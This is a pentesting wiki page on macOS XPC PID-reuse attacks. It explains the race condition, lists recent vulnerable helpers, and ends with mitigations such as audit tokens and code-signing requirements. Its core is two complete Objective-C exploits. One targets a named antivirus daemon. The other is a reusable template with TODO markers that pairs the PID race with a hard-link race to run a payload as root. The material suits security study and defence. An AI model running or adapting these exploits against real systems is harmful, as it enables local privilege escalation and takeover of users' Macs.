# macOS PID Reuse

{{#include ../../../../../../banners/hacktricks-training.md}}

## PID Reuse

When a macOS **XPC service** is checking the called process based on the **PID** and not on the **audit token**, it's vulnerable to PID reuse attack. This attack is based on a **race condition** where an **exploit** is going to **send messages to the XPC** service **abusing** the functionality and just **after** that, executing **`posix_spawn(NULL, target_binary, NULL, &attr, target_argv, environ)`** with the **allowed** binary.

This function will make the **allowed binary own the PID** but the **malicious XPC message would have been sent** just before. So, if the **XPC** service **use** the **PID** to **authenticate** the sender and checks it **AFTER** the execution of **`posix_spawn`**, it will think it comes from an **authorized** process.

### Exploit example

If you find the function **`shouldAcceptNewConnection`** or a function called by it **calling** **`processIdentifier`** and not calling **`auditToken`**. It highly probable means that it's **verifying the process PID** and not the audit token.\
Like for example in this image (taken from the reference):

<figure><img src="../../../../../../images/image (306).png" alt="https://wojciechregula.blog/images/2020/04/pid.png"><figcaption></figcaption></figure>

Check this example exploit (again, taken from the reference) to see the 2 parts of the exploit:

- One that **generates several forks**
- **Each fork** will **send** the **payload** to the XPC service while executing **`posix_spawn`** just after sending the message.

> [!CAUTION]
> For the exploit to work it's important to ` export`` `` `**`OBJC_DISABLE_INITIALIZE_FORK_SAFETY=YES`** or to put inside the exploit:
>
> ```objectivec
> asm(".section __DATA,__objc_fork_ok\n"
> "empty:\n"
> ".no_dead_strip empty\n");
> ```

{{#tabs}}
{{#tab name="NSTasks"}}
First option using **`NSTasks`** and argument to launch the children to exploit the RC

```objectivec
// Code from https://wojciechregula.blog/post/learn-xpc-exploitation-part-2-say-no-to-the-pid/
// gcc -framework Foundation expl.m -o expl

#import <Foundation/Foundation.h>
#include <spawn.h>
#include <sys/stat.h>

#define RACE_COUNT 32
#define MACH_SERVICE @"com.malwarebytes.mbam.rtprotection.daemon"
#define BINARY "/Library/Application Support/Malwarebytes/MBAM/Engine.bundle/Contents/PlugIns/RTProtectionDaemon.app/Contents/MacOS/RTProtectionDaemon"

// allow fork() between exec()
asm(".section __DATA,__objc_fork_ok\n"
"empty:\n"
".no_dead_strip empty\n");

extern char **environ;

// defining necessary protocols
@protocol ProtectionService
- (void)startDatabaseUpdate;
- (void)restoreApplicationLauncherWithCompletion:(void (^)(BOOL))arg1;
- (void)uninstallProduct;
- (void)installProductUpdate;
- (void)startProductUpdateWith:(NSUUID *)arg1 forceInstall:(BOOL)arg2;
- (void)buildPurchaseSiteURLWithCompletion:(void (^)(long long, NSString *))arg1;
- (void)triggerLicenseRelatedChecks;
- (void)buildRenewalLinkWith:(NSUUID *)arg1 completion:(void (^)(long long, NSString *))arg2;
- (void)cancelTrialWith:(NSUUID *)arg1 completion:(void (^)(long long))arg2;
- (void)startTrialWith:(NSUUID *)arg1 completion:(void (^)(long long))arg2;
- (void)unredeemLicenseKeyWith:(NSUUID *)arg1 completion:(void (^)(long long))arg2;
- (void)applyLicenseWith:(NSUUID *)arg1 key:(NSString *)arg2 completion:(void (^)(long long))arg3;
- (void)controlProtectionWithRawFeatures:(long long)arg1 rawOperation:(long long)arg2;
- (void)restartOS;
- (void)resumeScanJob;
- (void)pauseScanJob;
- (void)stopScanJob;
- (void)startScanJob;
- (void)disposeOperationBy:(NSUUID *)arg1;
- (void)subscribeTo:(long long)arg1;
- (void)pingWithTag:(NSUUID *)arg1 completion:(void (^)(NSUUID *, long long))arg2;
@end

void child() {

    // send the XPC messages
    NSXPCInterface *remoteInterface = [NSXPCInterface interfaceWithProtocol:@protocol(ProtectionService)];
    NSXPCConnection *xpcConnection = [[NSXPCConnection alloc] initWithMachServiceName:MACH_SERVICE options:NSXPCConnectionPrivileged];
    xpcConnection.remoteObjectInterface = remoteInterface;

    [xpcConnection resume];
    [xpcConnection.remoteObjectProxy restartOS];

    char target_binary[] = BINARY;
    char *target_argv[] = {target_binary, NULL};
    posix_spawnattr_t attr;
    posix_spawnattr_init(&attr);
    short flags;
    posix_spawnattr_getflags(&attr, &flags);
    flags |= (POSIX_SPAWN_SETEXEC | POSIX_SPAWN_START_SUSPENDED);
    posix_spawnattr_setflags(&attr, flags);
    posix_spawn(NULL, target_binary, NULL, &attr, target_argv, environ);
}

bool create_nstasks() {

    NSString *exec = [[NSBundle mainBundle] executablePath];
    NSTask *processes[RACE_COUNT];

    for (int i = 0; i < RACE_COUNT; i++) {
        processes[i] = [NSTask launchedTaskWithLaunchPath:exec arguments:@[ @"imanstask" ]];
    }

    int i = 0;
    struct timespec ts = {
        .tv_sec = 0,
        .tv_nsec = 500 * 1000000,
    };

    nanosleep(&ts, NULL);
    if (++i > 4) {
        for (int i = 0; i < RACE_COUNT; i++) {
            [processes[i] terminate];
        }
        return false;
    }

    return true;
}

int main(int argc, const char * argv[]) {

    if(argc > 1) {
        // called from the NSTasks
        child();

    } else {
        NSLog(@"Starting the race");
        create_nstasks();
    }

    return 0;
}
```

{{#endtab}}

{{#tab name="fork"}}
This example uses a raw **`fork`** to launch **children that will exploit the PID race condition** and then exploit **another race condition via a Hard link:**

```objectivec
// export OBJC_DISABLE_INITIALIZE_FORK_SAFETY=YES
// gcc -framework Foundation expl.m -o expl

#include <Foundation/Foundation.h>
#include <spawn.h>
#include <pthread.h>

// TODO: CHANGE PROTOCOL AND FUNCTIONS
@protocol HelperProtocol
- (void)DoSomething:(void (^)(_Bool))arg1;
@end

// Global flag to track exploitation status
bool pwned = false;

/**
 * Continuously overwrite the contents of the 'hard_link' file in a race condition to make the
 * XPC service verify the legit binary and then execute as root out payload.
 */
void *check_race(void *arg) {
    while(!pwned) {
        // Overwrite with contents of the legit binary
        system("cat ./legit_bin > hard_link");
        usleep(50000);

        // Overwrite with contents of the payload to execute
        // TODO: COMPILE YOUR OWN PAYLOAD BIN
        system("cat ./payload > hard_link");
        usleep(50000);
    }
    return NULL;
}

void child_xpc_pid_rc_abuse(){
    // TODO: INDICATE A VALID BIN TO BYPASS SIGN VERIFICATION
    #define kValid "./Legit Updater.app/Contents/MacOS/Legit"
    extern char **environ;

    // Connect with XPC service
    // TODO: CHANGE THE ID OF THE XPC TO EXPLOIT
    NSString*  service_name = @"com.example.Helper";
    NSXPCConnection* connection = [[NSXPCConnection alloc] initWithMachServiceName:service_name options:0x1000];
    // TODO: CNAGE THE PROTOCOL NAME
    NSXPCInterface* interface = [NSXPCInterface interfaceWithProtocol:@protocol(HelperProtocol)];
    [connection setRemoteObjectInterface:interface];
    [connection resume];

    id obj = [connection remoteObjectProxyWithErrorHandler:^(NSError* error) {
        NSLog(@"[-] Something went wrong");
        NSLog(@"[-] Error: %@", error);
    }];

    NSLog(@"obj: %@", obj);
    NSLog(@"conn: %@", connection);

    // Call vulenrable XPC function
    // TODO: CHANEG NAME OF FUNCTION TO CALL
    [obj DoSomething:^(_Bool b){
        NSLog(@"Response, %hdd", b);
    }];

    // Change current process to the legit binary suspended
    char target_binary[] = kValid;
    char *target_argv[] = {target_binary, NULL};
    posix_spawnattr_t attr;
    posix_spawnattr_init(&attr);
    short flags;
    posix_spawnattr_getflags(&attr, &flags);
    flags |= (POSIX_SPAWN_SETEXEC | POSIX_SPAWN_START_SUSPENDED);
    posix_spawnattr_setflags(&attr, flags);
    posix_spawn(NULL, target_binary, NULL, &attr, target_argv, environ);
}

/**
 * Function to perform the PID race condition using children calling the XPC exploit.
 */
void xpc_pid_rc_abuse() {
    #define RACE_COUNT 1
    extern char **environ;
    int pids[RACE_COUNT];

    // Fork child processes to exploit
    for (int i = 0; i < RACE_COUNT; i++) {
        int pid = fork();
        if (pid == 0) {  // If a child process
            child_xpc_pid_rc_abuse();
        }
        printf("forked %d\n", pid);
        pids[i] = pid;
    }

    // Wait for children to finish their tasks
    sleep(3);

    // Terminate child processes
    for (int i = 0; i < RACE_COUNT; i++) {
        if (pids[i]) {
            kill(pids[i], 9);
        }
    }
}

int main(int argc, const char * argv[]) {
    // Create and set execution rights to 'hard_link' file
    system("touch hard_link");
    system("chmod +x hard_link");

    // Create thread to exploit sign verification RC
    pthread_t thread;
    pthread_create(&thread, NULL, check_race, NULL);

    while(!pwned) {
        // Try creating 'download' directory, ignore errors
        system("mkdir download 2>/dev/null");

        // Create a hardlink
        // TODO: CHANGE NAME OF FILE FOR SIGN VERIF RC
        system("ln hard_link download/legit_bin");

        xpc_pid_rc_abuse();
        usleep(10000);

        // The payload will generate this file if exploitation is successfull
        if (access("/tmp/pwned", F_OK ) == 0) {
            pwned = true;
        }
    }

    return 0;
}
```

{{#endtab}}
{{#endtabs}}

## Other examples

- [https://gergelykalman.com/why-you-shouldnt-use-a-commercial-vpn-amateur-hour-with-windscribe.html](https://gergelykalman.com/why-you-shouldnt-use-a-commercial-vpn-amateur-hour-with-windscribe.html)

### Recent vulnerable software (2023-2024)

- **GOG Galaxy ClientService – CVE-2023-40713.** The privileged *com.galaxy.ClientService* helper only validated the caller’s PID and then called `proc_pidpath()` **after** processing the incoming request. By racing a fork/`posix_spawn()` sequence an unprivileged user could impersonate the legitimate GUI client and gain **root** on macOS Ventura ≤ 13.4. The issue was fixed in GOG Galaxy v2.0.67 by switching to `audit_token_t`-based checks and enforcing a code-signing requirement. 

- **Sensei Mac Cleaner Helper – CVE-2024-7915.** The update/diagnostic helper *org.cindori.SenseiHelper* trusted `NSXPCConnection.processIdentifier`. A local attacker could exploit PID reuse to send crafted XPC messages and execute arbitrary helper methods, leading to full-disk access and privilege escalation on macOS Sonoma 14.1. Patched in Sensei v1.6.7. 

### Modern mitigations & detection

1. **Use audit tokens – not PIDs**  
   Retrieve the peer audit token with the C API `xpc_connection_get_audit_token()` or the Objective-C property `NSXPCConnection.effectiveAuditToken` (macOS 12+). The 32-bit *pidversion* field inside the token makes it immune to PID reuse.

2. **Enforce code-signing requirements (macOS 12+).**  
   • C API: `xpc_connection_set_peer_code_signing_requirement(conn, "identifier com.mycorp.app and anchor apple");`  
   • Obj-C:  
   ```objectivec
   if (@available(macOS 13.0, *)) {
       [connection setCodeSigningRequirement:@"identifier com.mycorp.app and anchor apple"];
   }
   ```
   These APIs completely remove the need for manual PID or audit-token parsing. 

3. **Monitor for suspicious `SETEXEC` spawns.**  
   EndpointSecurity can alert on `ES_EVENT_TYPE_NOTIFY_EXEC` events where `spawn_flags` contain `POSIX_SPAWN_SETEXEC` or `POSIX_SPAWN_START_SUSPENDED`, patterns that appear in most PID-reuse exploits.

4. **Rate-limit forks or deny rapid restarts.**  
   If the caller has performed an abnormal number of forks in a short period (obtainable via `proc_pidinfo()`), reject the request.

## References

- [https://wojciechregula.blog/post/learn-xpc-exploitation-part-2-say-no-to-the-pid/](https://wojciechregula.blog/post/learn-xpc-exploitation-part-2-say-no-to-the-pid/)
- [https://saelo.github.io/presentations/warcon18_dont_trust_the_pid.pdf](https://saelo.github.io/presentations/warcon18_dont_trust_the_pid.pdf)
- [https://security.ibmcloud.com/advisories/CVE-2023-40713](https://security.ibmcloud.com/advisories/CVE-2023-40713)
- https://github.com/advisories/GHSA-vgfw-cgxj-f63c (CVE-2024-7915)
- [https://developer.apple.com/forums/thread/681053](https://developer.apple.com/forums/thread/681053)

{{#include ../../../../../../banners/hacktricks-training.md}}


